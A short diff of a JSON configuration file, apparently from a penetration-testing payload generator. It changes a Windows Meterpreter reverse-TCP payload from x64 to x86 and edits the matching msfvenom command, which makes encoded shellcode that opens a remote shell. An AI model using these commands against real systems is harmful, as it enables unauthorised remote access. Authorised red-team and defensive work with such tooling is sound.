@@ -3,11 +3,11 @@
         "platform": "windows",
         "port": 6001,
         "stageencoder": "x86/fnstenv_mov",
-        "payload_name": "windows/x64/meterpreter/reverse_tcp",
+        "payload_name": "windows/meterpreter/reverse_tcp",
         "payloads": [
             {
                 "name": "shellcode_x86",
-                "generate": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f raw > shellcode_x86.bin"
+                "generate": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f raw > shellcode_x86.bin"
             },
             {
                 "name": "exe_x86",
